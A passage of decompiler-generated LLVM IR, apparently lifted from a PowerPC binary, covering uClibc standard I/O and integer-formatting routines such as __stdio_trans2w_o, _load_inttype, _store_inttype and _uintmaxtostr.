  br i1 %v3_1000c70c, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c714

dec_label_pc_1000c714:                            ; preds = %dec_label_pc_1000c704
  %v0_1000c714 = load i32, i32* @r29, align 4
  %v3_1000c714 = icmp ugt i32 %v0_1000c714, %v2_1000c708
  %v2_1000c708.v0_1000c718 = select i1 %v3_1000c714, i32 %v2_1000c708, i32 %v0_1000c714
  store i32 %v2_1000c708.v0_1000c718, i32* @r31, align 4
  %v2_1000c724 = sub i32 %v0_1000c714, %v2_1000c708.v0_1000c718
  %v0_1000c72c = load i32, i32* @r28, align 4
  %v2_1000c72c = add i32 %v0_1000c72c, %v2_1000c724
  store i32 %v2_1000c72c, i32* @r28, align 4
  store i32 %v2_1000c72c, i32* @r3, align 4
  store i32 268486460, i32* @lr, align 4
  %v3_1000c738 = call i32 @__GI_memchr(i32 %v2_1000c72c, i32 10, i32 %v2_1000c708.v0_1000c718)
  %v3_1000c73c = icmp eq i32 %v3_1000c738, 0
  br i1 %v3_1000c73c, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c744

dec_label_pc_1000c744:                            ; preds = %dec_label_pc_1000c714
  %v0_1000c744 = load i32, i32* @r30, align 4
  %v1_1000c744 = add i32 %v0_1000c744, 16
  %v2_1000c744 = inttoptr i32 %v1_1000c744 to i32*
  %v3_1000c744 = load i32, i32* %v2_1000c744, align 4
  %v0_1000c748 = load i32, i32* @r28, align 4
  %v1_1000c748 = load i32, i32* @r31, align 4
  %v2_1000c748 = sub i32 %v0_1000c748, %v3_1000c738
  %v2_1000c74c = add i32 %v2_1000c748, %v1_1000c748
  %v2_1000c750 = sub i32 %v3_1000c744, %v2_1000c74c
  %v1_1000c754 = load i32, i32* @r29, align 4
  %v2_1000c754 = sub i32 %v1_1000c754, %v2_1000c74c
  store i32 %v2_1000c754, i32* @r29, align 4
  store i32 %v2_1000c750, i32* %v2_1000c744, align 4
  br label %dec_label_pc_1000c7a4

dec_label_pc_1000c760:                            ; preds = %dec_label_pc_1000c6bc
  %v2_1000c760 = add i32 %tmp, 8
  %v3_1000c760 = inttoptr i32 %v2_1000c760 to i32*
  %v4_1000c760 = load i32, i32* %v3_1000c760, align 4
  %v4_1000c764 = icmp eq i32 %v4_1000c67c, %v4_1000c760
  br i1 %v4_1000c764, label %dec_label_pc_1000c784, label %dec_label_pc_1000c76c

dec_label_pc_1000c76c:                            ; preds = %dec_label_pc_1000c760
  store i32 268486516, i32* @lr, align 4
  %v2_1000c770 = call i32 @__stdio_wcommit(i32 %tmp)
  %v3_1000c774 = icmp eq i32 %v2_1000c770, 0
  br i1 %v3_1000c774, label %dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge, label %dec_label_pc_1000c77c

dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge: ; preds = %dec_label_pc_1000c76c
  %v0_1000c788.pre = load i32, i32* @r30, align 4
  %v0_1000c78c.pre = load i32, i32* @r28, align 4
  %v0_1000c790.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c784

dec_label_pc_1000c77c:                            ; preds = %dec_label_pc_1000c76c
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000c7a4

dec_label_pc_1000c784:                            ; preds = %dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge, %entry, %dec_label_pc_1000c760
  %v0_1000c790 = phi i32 [ %v0_1000c790.pre, %dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000c760 ]
  %v0_1000c78c = phi i32 [ %v0_1000c78c.pre, %dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000c760 ]
  %v0_1000c788 = phi i32 [ %v0_1000c788.pre, %dec_label_pc_1000c76c.dec_label_pc_1000c784_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000c760 ]
  %v1_1000c788 = inttoptr i32 %v0_1000c788 to i16*
  store i32 %v0_1000c790, i32* @r5, align 4
  store i32 %v0_1000c650, i32* @lr, align 4
  %v5_1000c7a0 = call i32 @__stdio_WRITE(i16* %v1_1000c788, i32 %v0_1000c78c)
  br label %dec_label_pc_1000c7a4

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c714, %dec_label_pc_1000c704, %dec_label_pc_1000c6ec, %dec_label_pc_1000c6c8, %dec_label_pc_1000c77c, %dec_label_pc_1000c744, %dec_label_pc_1000c6a0, %dec_label_pc_1000c784
  %v0_1000c7a8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000c7a8

; uselistorder directives
  uselistorder i32 %v2_1000c74c, { 1, 0 }
  uselistorder i32 %v2_1000c708.v0_1000c718, { 0, 2, 1 }
  uselistorder i32 %v0_1000c714, { 1, 0, 2 }
  uselistorder i32 %v2_1000c68c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000c7a4, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000c784, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c6a0, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000c7bc = load i32, i32* @lr, align 4
  store i32 %v0_1000c7bc, i32* %r0.global-to-local, align 4
  %v0_1000c7c4 = load i32, i32* @r31, align 4
  %v0_1000c7c8 = load i32, i32* @r3, align 4
  store i32 %v0_1000c7c8, i32* @r31, align 4
  %v1_1000c7d0 = inttoptr i32 %v0_1000c7c8 to i16*
  %v2_1000c7d0 = load i16, i16* %v1_1000c7d0, align 2
  %v3_1000c7d0 = zext i16 %v2_1000c7d0 to i32
  store i32 %v3_1000c7d0, i32* %r0.global-to-local, align 4
  %v1_1000c7d4 = load i32, i32* @r4, align 4
  %v2_1000c7d4 = and i32 %v1_1000c7d4, %v3_1000c7d0
  store i32 %v2_1000c7d4, i32* %r9.global-to-local, align 4
  %v5_1000c7d4 = icmp eq i32 %v2_1000c7d4, 0
  br i1 %v5_1000c7d4, label %dec_label_pc_1000c7dc, label %dec_label_pc_1000c7ec

dec_label_pc_1000c7dc:                            ; preds = %entry
  %v1_1000c7dc = and i32 %v3_1000c7d0, 2176
  store i32 %v1_1000c7dc, i32* %r9.global-to-local, align 4
  %v3_1000c7dc = icmp eq i32 %v1_1000c7dc, 0
  br i1 %v3_1000c7dc, label %dec_label_pc_1000c7e4, label %dec_label_pc_1000c7f8

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c7dc
  %v2_1000c7e4 = or i32 %v1_1000c7d4, %v3_1000c7d0
  store i32 %v2_1000c7e4, i32* %r0.global-to-local, align 4
  %v1_1000c7e8 = trunc i32 %v2_1000c7e4 to i16
  store i16 %v1_1000c7e8, i16* %v1_1000c7d0, align 2
  %v0_1000c7ec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c7ec

dec_label_pc_1000c7ec:                            ; preds = %entry, %dec_label_pc_1000c7e4
  %v0_1000c828 = phi i32 [ %v0_1000c7c8, %entry ], [ %v0_1000c7ec.pre, %dec_label_pc_1000c7e4 ]
  %v1_1000c7ec = inttoptr i32 %v0_1000c828 to i16*
  %v2_1000c7ec = load i16, i16* %v1_1000c7ec, align 2
  %v3_1000c7ec = zext i16 %v2_1000c7ec to i32
  %v1_1000c7f0 = and i32 %v3_1000c7ec, 32
  store i32 %v1_1000c7f0, i32* %r0.global-to-local, align 4
  %v3_1000c7f0 = icmp eq i32 %v1_1000c7f0, 0
  br i1 %v3_1000c7f0, label %dec_label_pc_1000c818, label %dec_label_pc_1000c7f8

dec_label_pc_1000c7f8:                            ; preds = %dec_label_pc_1000c7dc, %dec_label_pc_1000c7ec
  %v0_1000c7f8 = call i32 @__errno_location()
  store i32 %v0_1000c7f8, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000c800 = inttoptr i32 %v0_1000c7f8 to i32*
  store i32 9, i32* %v2_1000c800, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c840, %dec_label_pc_1000c7f8
  %v0_1000c804 = load i32, i32* @r31, align 4
  %v1_1000c804 = inttoptr i32 %v0_1000c804 to i16*
  %v2_1000c804 = load i16, i16* %v1_1000c804, align 2
  %v3_1000c804 = zext i16 %v2_1000c804 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000c80c = or i32 %v3_1000c804, 8
  store i32 %v1_1000c80c, i32* %r0.global-to-local, align 4
  %v1_1000c810 = trunc i32 %v1_1000c80c to i16
  store i16 %v1_1000c810, i16* %v1_1000c804, align 2
  br label %dec_label_pc_1000c8a0

dec_label_pc_1000c818:                            ; preds = %dec_label_pc_1000c7ec
  %tmp = urem i16 %v2_1000c7ec, 4
  %v1_1000c818 = zext i16 %tmp to i32
  store i32 %v1_1000c818, i32* %r0.global-to-local, align 4
  %v3_1000c818 = icmp eq i16 %tmp, 0
  br i1 %v3_1000c818, label %dec_label_pc_1000c87c, label %dec_label_pc_1000c820

dec_label_pc_1000c820:                            ; preds = %dec_label_pc_1000c818
  %v1_1000c820 = and i32 %v3_1000c7ec, 4
  store i32 %v1_1000c820, i32* %r9.global-to-local, align 4
  %v3_1000c820 = icmp eq i32 %v1_1000c820, 0
  br i1 %v3_1000c820, label %dec_label_pc_1000c828, label %dec_label_pc_1000c860

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c820
  %v1_1000c828 = add i32 %v0_1000c828, 20
  %v2_1000c828 = inttoptr i32 %v1_1000c828 to i32*
  %v3_1000c828 = load i32, i32* %v2_1000c828, align 4
  store i32 %v3_1000c828, i32* %r0.global-to-local, align 4
  %v1_1000c82c = add i32 %v0_1000c828, 16
  %v2_1000c82c = inttoptr i32 %v1_1000c82c to i32*
  %v3_1000c82c = load i32, i32* %v2_1000c82c, align 4
  store i32 %v3_1000c82c, i32* %r9.global-to-local, align 4
  %v4_1000c830 = icmp eq i32 %v3_1000c828, %v3_1000c82c
  br i1 %v4_1000c830, label %dec_label_pc_1000c838, label %dec_label_pc_1000c840

dec_label_pc_1000c838:                            ; preds = %dec_label_pc_1000c828
  %v1_1000c838 = and i32 %v3_1000c7ec, 2
  store i32 %v1_1000c838, i32* %r0.global-to-local, align 4
  %v3_1000c838 = icmp eq i32 %v1_1000c838, 0
  br i1 %v3_1000c838, label %dec_label_pc_1000c860, label %dec_label_pc_1000c840

dec_label_pc_1000c840:                            ; preds = %dec_label_pc_1000c828, %dec_label_pc_1000c838
  %v1_1000c840 = and i32 %v3_1000c7ec, 1024
  store i32 %v1_1000c840, i32* %r9.global-to-local, align 4
  %v0_1000c848 = call i32 @__asm_mfcr()
  store i32 %v0_1000c848, i32* %r3.global-to-local, align 4
  %v1_1000c84c = call i32 @__asm_rlwinm(i32 %v0_1000c848, i32 3, i32 31, i32 31)
  %v1_1000c850 = sub i32 2, %v1_1000c84c
  store i32 %v1_1000c850, i32* @r5, align 4
  store i32 268486744, i32* @lr, align 4
  %v1_1000c854 = call i32 @__GI_fseek(i32 %v1_1000c850)
  store i32 %v1_1000c854, i32* %r3.global-to-local, align 4
  %v3_1000c858 = icmp eq i32 %v1_1000c854, 0
  br i1 %v3_1000c858, label %dec_label_pc_1000c840.dec_label_pc_1000c860_crit_edge, label %dec_label_pc_1000c804

dec_label_pc_1000c840.dec_label_pc_1000c860_crit_edge: ; preds = %dec_label_pc_1000c840
  %v0_1000c860.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c860

dec_label_pc_1000c860:                            ; preds = %dec_label_pc_1000c840.dec_label_pc_1000c860_crit_edge, %dec_label_pc_1000c820, %dec_label_pc_1000c838
  %v0_1000c860 = phi i32 [ %v0_1000c860.pre, %dec_label_pc_1000c840.dec_label_pc_1000c860_crit_edge ], [ %v0_1000c828, %dec_label_pc_1000c820 ], [ %v0_1000c828, %dec_label_pc_1000c838 ]
  %v1_1000c860 = inttoptr i32 %v0_1000c860 to i16*
  %v2_1000c860 = load i16, i16* %v1_1000c860, align 2
  %v3_1000c860 = zext i16 %v2_1000c860 to i32
  store i32 %v3_1000c860, i32* %r0.global-to-local, align 4
  %v1_1000c864 = add i32 %v0_1000c860, 8
  %v2_1000c864 = inttoptr i32 %v1_1000c864 to i32*
  %v3_1000c864 = load i32, i32* %v2_1000c864, align 4
  store i32 %v3_1000c864, i32* %r9.global-to-local, align 4
  %v1_1000c868 = call i32 @__asm_rlwinm(i32 %v3_1000c860, i32 0, i32 0, i32 29)
  %v2_1000c868 = trunc i32 %v1_1000c868 to i16
  store i32 %v1_1000c868, i32* %r0.global-to-local, align 4
  %v3_1000c86c = load i32, i32* @r31, align 4
  %v4_1000c86c = inttoptr i32 %v3_1000c86c to i16*
  store i16 %v2_1000c868, i16* %v4_1000c86c, align 2
  %v0_1000c870 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c870 = load i32, i32* @r31, align 4
  %v2_1000c870 = add i32 %v1_1000c870, 20
  %v3_1000c870 = inttoptr i32 %v2_1000c870 to i32*
  store i32 %v0_1000c870, i32* %v3_1000c870, align 4
  %v0_1000c874 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c874 = load i32, i32* @r31, align 4
  %v2_1000c874 = add i32 %v1_1000c874, 24
  %v3_1000c874 = inttoptr i32 %v2_1000c874 to i32*
  store i32 %v0_1000c874, i32* %v3_1000c874, align 4
  %v0_1000c878 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c878 = load i32, i32* @r31, align 4
  %v2_1000c878 = add i32 %v1_1000c878, 16
  %v3_1000c878 = inttoptr i32 %v2_1000c878 to i32*
  store i32 %v0_1000c878, i32* %v3_1000c878, align 4
  %v0_1000c87c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c87c

dec_label_pc_1000c87c:                            ; preds = %dec_label_pc_1000c818, %dec_label_pc_1000c860
  %v2_1000c888 = phi i32 [ %v0_1000c828, %dec_label_pc_1000c818 ], [ %v0_1000c87c.pre, %dec_label_pc_1000c860 ]
  %v1_1000c87c = inttoptr i32 %v2_1000c888 to i16*
  %v2_1000c87c = load i16, i16* %v1_1000c87c, align 2
  %v3_1000c87c = zext i16 %v2_1000c87c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000c884 = or i32 %v3_1000c87c, 64
  store i32 %v1_1000c884, i32* %r0.global-to-local, align 4
  %v1_1000c888 = trunc i32 %v1_1000c884 to i16
  store i16 %v1_1000c888, i16* %v1_1000c87c, align 2
  %v0_1000c88c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c88c = urem i32 %v0_1000c88c, 65536
  store i32 %v1_1000c88c, i32* %r0.global-to-local, align 4
  %v1_1000c890 = and i32 %v0_1000c88c, 2816
  store i32 %v1_1000c890, i32* %r9.global-to-local, align 4
  %v3_1000c890 = icmp eq i32 %v1_1000c890, 0
  br i1 %v3_1000c890, label %dec_label_pc_1000c898, label %dec_label_pc_1000c8a0

dec_label_pc_1000c898:                            ; preds = %dec_label_pc_1000c87c
  %v0_1000c898 = load i32, i32* @r31, align 4
  %v1_1000c898 = add i32 %v0_1000c898, 12
  %v2_1000c898 = inttoptr i32 %v1_1000c898 to i32*
  %v3_1000c898 = load i32, i32* %v2_1000c898, align 4
  store i32 %v3_1000c898, i32* %r0.global-to-local, align 4
  %v2_1000c89c = add i32 %v0_1000c898, 28
  %v3_1000c89c = inttoptr i32 %v2_1000c89c to i32*
  store i32 %v3_1000c898, i32* %v3_1000c89c, align 4
  br label %dec_label_pc_1000c8a0

dec_label_pc_1000c8a0:                            ; preds = %dec_label_pc_1000c87c, %dec_label_pc_1000c804, %dec_label_pc_1000c898
  store i32 %v0_1000c7bc, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c7c4, i32* @r31, align 4
  %v0_1000c8b0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c8b0

; uselistorder directives
  uselistorder i32 %v0_1000c88c, { 1, 0 }
  uselistorder i32 %v1_1000c868, { 1, 0 }
  uselistorder i32 %v0_1000c860, { 1, 0 }
  uselistorder i32 %v0_1000c828, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_1000c7d0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 29, { 2, 5, 6, 0, 1, 7, 8, 3, 4, 11, 12, 9, 10 }
  uselistorder i32 1024, { 13, 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 16, 10 }
  uselistorder label %dec_label_pc_1000c8a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c87c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c860, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c840, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7ec, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1000c8b4 = load i32, i32* @r5, align 4
  %v1_1000c8b4 = icmp slt i32 %v0_1000c8b4, 0
  %v1_1000c8b8 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_1000c8f4 = icmp eq i32 %v1_1000c8b8, 0
  br i1 %v1_1000c8b4, label %dec_label_pc_1000c8f4, label %dec_label_pc_1000c8c0

dec_label_pc_1000c8c0:                            ; preds = %entry
  br i1 %v3_1000c8f4, label %dec_label_pc_1000c8c8, label %dec_label_pc_1000c8fc

dec_label_pc_1000c8c8:                            ; preds = %dec_label_pc_1000c8c0
  %v3_1000c8c8 = icmp eq i32 %arg1, 256
  br i1 %v3_1000c8c8, label %dec_label_pc_1000c8d4, label %dec_label_pc_1000c8dc

dec_label_pc_1000c8d4:                            ; preds = %dec_label_pc_1000c8c8
  br label %dec_label_pc_1000c8e8

dec_label_pc_1000c8dc:                            ; preds = %dec_label_pc_1000c8c8
  %v3_1000c8dc = icmp eq i32 %arg1, 512
  br i1 %v3_1000c8dc, label %dec_label_pc_1000c8e4, label %dec_label_pc_1000c8e8

dec_label_pc_1000c8e4:                            ; preds = %dec_label_pc_1000c8dc
  br label %dec_label_pc_1000c8e8

dec_label_pc_1000c8e8:                            ; preds = %dec_label_pc_1000c8dc, %dec_label_pc_1000c8d4, %dec_label_pc_1000c8e4
  ret i32 0

dec_label_pc_1000c8f4:                            ; preds = %entry
  br i1 %v3_1000c8f4, label %dec_label_pc_1000c908, label %dec_label_pc_1000c8fc

dec_label_pc_1000c8fc:                            ; preds = %dec_label_pc_1000c8c0, %dec_label_pc_1000c8f4
  %v2_1000c8fc = load i32, i32* %arg2, align 4
  ret i32 %v2_1000c8fc

dec_label_pc_1000c908:                            ; preds = %dec_label_pc_1000c8f4
  %v3_1000c908 = icmp eq i32 %arg1, 256
  %v2_1000c90c = load i32, i32* %arg2, align 4
  br i1 %v3_1000c908, label %dec_label_pc_1000c914, label %dec_label_pc_1000c91c

dec_label_pc_1000c914:                            ; preds = %dec_label_pc_1000c908
  %v1_1000c914 = urem i32 %v2_1000c90c, 256
  br label %dec_label_pc_1000c928

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c908
  %v3_1000c91c = icmp eq i32 %arg1, 512
  br i1 %v3_1000c91c, label %dec_label_pc_1000c924, label %dec_label_pc_1000c928

dec_label_pc_1000c924:                            ; preds = %dec_label_pc_1000c91c
  %v1_1000c924 = mul i32 %v2_1000c90c, 65536
  %v2_1000c924 = sdiv i32 %v1_1000c924, 65536
  br label %dec_label_pc_1000c928

dec_label_pc_1000c928:                            ; preds = %dec_label_pc_1000c91c, %dec_label_pc_1000c914, %dec_label_pc_1000c924
  %v0_1000c928 = phi i32 [ %v2_1000c90c, %dec_label_pc_1000c91c ], [ %v1_1000c914, %dec_label_pc_1000c914 ], [ %v2_1000c924, %dec_label_pc_1000c924 ]
  %tmp = icmp slt i32 %v0_1000c928, 0
  %v1_1000c92c = zext i1 %tmp to i32
  %v2_1000c92c = ashr i32 %v0_1000c928, 31
  %v3_1000c92c = and i32 %v2_1000c92c, -2
  %v4_1000c92c = or i32 %v3_1000c92c, %v1_1000c92c
  ret i32 %v4_1000c92c

; uselistorder directives
  uselistorder i32 %v0_1000c928, { 1, 0 }
  uselistorder i32 %v2_1000c90c, { 2, 0, 1 }
  uselistorder i1 %v3_1000c8f4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 1, 2, 3, 4, 31, 32, 25, 26, 0, 30, 5, 33, 34, 35, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 29, 22, 23, 24, 27, 28, 36 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c928, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c8fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8e8, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000c934 = load i32, i32* @r4, align 4
  %v3_1000c934 = icmp eq i32 %v0_1000c934, 256
  br i1 %v3_1000c934, label %dec_label_pc_1000c940, label %dec_label_pc_1000c948

dec_label_pc_1000c940:                            ; preds = %entry
  %v0_1000c940 = load i32, i32* @r6, align 4
  %v1_1000c940 = trunc i32 %v0_1000c940 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000c940, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000c948:                            ; preds = %entry
  %v3_1000c938 = icmp eq i32 %v0_1000c934, 2048
  br i1 %v3_1000c938, label %dec_label_pc_1000c950, label %dec_label_pc_1000c95c

dec_label_pc_1000c950:                            ; preds = %dec_label_pc_1000c948
  %v0_1000c950 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000c950, i32* %tmp2, align 4
  %v0_1000c954 = load i32, i32* @r6, align 4
  %v3_1000c954 = add i32 %tmp, 4
  %v4_1000c954 = inttoptr i32 %v3_1000c954 to i32*
  store i32 %v0_1000c954, i32* %v4_1000c954, align 4
  ret i32 %tmp

dec_label_pc_1000c95c:                            ; preds = %dec_label_pc_1000c948
  %v3_1000c948 = icmp eq i32 %v0_1000c934, 512
  %v0_1000c960 = load i32, i32* @r6, align 4
  br i1 %v3_1000c948, label %dec_label_pc_1000c960, label %dec_label_pc_1000c968

dec_label_pc_1000c960:                            ; preds = %dec_label_pc_1000c95c
  %v1_1000c960 = trunc i32 %v0_1000c960 to i16
  store i16 %v1_1000c960, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000c968:                            ; preds = %dec_label_pc_1000c95c
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000c960, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 512, { 2, 3, 4, 1, 0 }
  uselistorder i32* @r6, { 0, 1, 2, 3, 4, 5, 6, 10, 11, 7, 8, 9 }
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000c970 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c970 = icmp eq i32 %v0_1000c970, 0
  store i1 %v3_1000c970, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_1000c970, -1
  br i1 %tmp12, label %dec_label_pc_1000c9a4, label %dec_label_pc_1000c984

dec_label_pc_1000c984:                            ; preds = %entry
  %v0_1000c984 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c988 = sub i32 0, %v0_1000c970
  store i32 %v1_1000c988, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_1000c984, -1
  br i1 %tmp13, label %dec_label_pc_1000c9a4, label %dec_label_pc_1000c990

dec_label_pc_1000c990:                            ; preds = %dec_label_pc_1000c984
  %v0_1000c990 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c990 = sub i32 0, %v0_1000c990
  %v2_1000c990 = sub i32 -1, %v0_1000c990
  store i32 %v1_1000c990, i32* %r6.global-to-local, align 4
  %v4_1000c990 = icmp uge i32 %v2_1000c990, %v1_1000c990
  %v1_1000c994 = sub i32 -1, %v0_1000c984
  %v3_1000c994 = zext i1 %v4_1000c990 to i32
  %v4_1000c994 = add i32 %v3_1000c994, %v1_1000c994
  store i32 %v4_1000c994, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c9a4

dec_label_pc_1000c9a4:                            ; preds = %entry, %dec_label_pc_1000c984, %dec_label_pc_1000c990
  %v1_1000c9a8 = phi i32 [ %v1_1000c988, %dec_label_pc_1000c990 ], [ %v1_1000c988, %dec_label_pc_1000c984 ], [ %v0_1000c970, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000c990 ], [ 0, %dec_label_pc_1000c984 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000c9a8 = udiv i32 -1, %v1_1000c9a8
  store i32 %v2_1000c9a8, i32* %r8.global-to-local, align 4
  %v2_1000c9b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000c9b0 = inttoptr i32 %v2_1000c9b0 to i8*
  store i8 0, i8* %v3_1000c9b0, align 1
  %v0_1000c9b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c9b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000c9b4 = mul i32 %v1_1000c9b4, %v0_1000c9b4
  %v1_1000c9b8 = sub i32 0, %v2_1000c9b4
  store i32 %v1_1000c9b8, i32* @r31, align 4
  %v4_1000c9bc = icmp eq i32 %v1_1000c9b4, %v1_1000c9b8
  br i1 %v4_1000c9bc, label %dec_label_pc_1000c9c4, label %dec_label_pc_1000c9cc

dec_label_pc_1000c9c4:                            ; preds = %dec_label_pc_1000c9a4
  %v1_1000c9c4 = add i32 %v0_1000c9b4, 1
  store i32 %v1_1000c9c4, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000c9cc

dec_label_pc_1000c9cc:                            ; preds = %dec_label_pc_1000c9a4, %dec_label_pc_1000c9c4
  %v0_1000c9cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000c9cc, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000c9d0

dec_label_pc_1000c9d0thread-pre-split:            ; preds = %dec_label_pc_1000ca24
  %v0_1000c9d0.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000c9d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c9d0

dec_label_pc_1000c9d0:                            ; preds = %dec_label_pc_1000c9d0thread-pre-split, %dec_label_pc_1000c9cc
  %v1_1000ca18 = phi i32 [ %v1_1000c9d4.pre, %dec_label_pc_1000c9d0thread-pre-split ], [ %v1_1000c9b4, %dec_label_pc_1000c9cc ]
  %v1_1000c9e8 = phi i32 [ %v0_1000c9d0.pr, %dec_label_pc_1000c9d0thread-pre-split ], [ %v0_1000c9cc, %dec_label_pc_1000c9cc ]
  %v3_1000c9d0 = icmp eq i32 %v1_1000c9e8, 0
  %v0_1000c9d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c9d4 = udiv i32 %v0_1000c9d4, %v1_1000ca18
  br i1 %v3_1000c9d0, label %dec_label_pc_1000ca18, label %dec_label_pc_1000c9dc

dec_label_pc_1000c9dc:                            ; preds = %dec_label_pc_1000c9d0
  %v2_1000c9dc = udiv i32 %v1_1000c9e8, %v1_1000ca18
  %v2_1000c9e0 = mul i32 %v2_1000c9dc, %v1_1000ca18
  %v2_1000c9e4 = mul i32 %v2_1000c9d4, %v1_1000ca18
  %v2_1000c9e8 = sub i32 %v1_1000c9e8, %v2_1000c9e0
  store i32 %v2_1000c9dc, i32* %r12.global-to-local, align 4
  %v0_1000c9f0 = load i32, i32* @r31, align 4
  %v2_1000c9f0 = mul i32 %v0_1000c9f0, %v2_1000c9e8
  %v2_1000c9f4 = sub i32 %v0_1000c9d4, %v2_1000c9e4
  %v2_1000c9f8 = add i32 %v2_1000c9f0, %v2_1000c9f4
  %v0_1000c9fc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000c9fc = mul i32 %v0_1000c9fc, %v2_1000c9e8
  %v2_1000ca00 = udiv i32 %v2_1000c9f8, %v1_1000ca18
